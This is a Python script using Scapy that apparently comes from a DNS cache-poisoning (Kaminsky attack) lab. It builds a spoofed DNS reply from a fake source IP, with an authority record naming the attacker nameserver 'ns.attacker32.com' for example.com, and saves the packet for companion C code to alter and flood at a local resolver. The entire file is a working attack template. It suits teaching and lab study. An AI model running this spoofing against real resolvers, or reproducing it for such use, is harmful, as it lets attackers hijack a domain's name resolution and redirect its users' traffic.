#!/bin/env python3

from scapy.all import *

# We are targeting the example.com domain.
targetName   = 'aaaaa.example.com'
targetDomain = 'example.com'

# The objective of the attack is to get the targeted local
# DNS server to use the following name as the nameserver
# for the example.com domain. 
attackerNS = 'ns.attacker32.com'

# dstIP is the IP address of the targeted local DNS server.
# srcIP can be address, because it will be replaced with
# the IP address of example.com's actual name server. 
dstIP = '10.9.0.53' 
srcIP = '1.2.3.4' 

# Construct the IP and UDP header 
ip  = IP (dst = dstIP, src = srcIP)

# Set the checksum filed to zero. If this field is not set,
# Scapy will calculate checksum for us. Since the UDP packet
# will be modified later, this checksum will become invalid. 
# Setting this field to zero means ignoring checksum (supported by UDP).
# Scapy will not do the calculation for us if the field is already set.
udp = UDP(dport = 33333, sport = 53,  chksum=0)

# Construct the Question section
# The C code will modify the qname field
Qdsec  = DNSQR(qname  = targetName)

# Construct the Answer section (the answer can be anything)
# The C code will modify the rrname field
Anssec = DNSRR(rrname = targetName,  
               type   = 'A', 
               rdata  = '1.1.1.1', 
               ttl    = 259200)

# Construct the Authority section (the main goal of the attack) 
NSsec  = DNSRR(rrname = targetDomain, 
               type   = 'NS', 
               rdata  = attackerNS, 
               ttl    = 259200)

# Construct the DNS part 
# The C code will modify the id field
dns    = DNS(id  = 0xAAAA, aa=1, rd=1, qr=1, 
             qdcount = 1, qd = Qdsec, 
             ancount = 1, an = Anssec, 
             nscount = 1, ns = NSsec)

# Construct the IP packet and save it to a file.
Replypkt = ip/udp/dns
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(Replypkt))
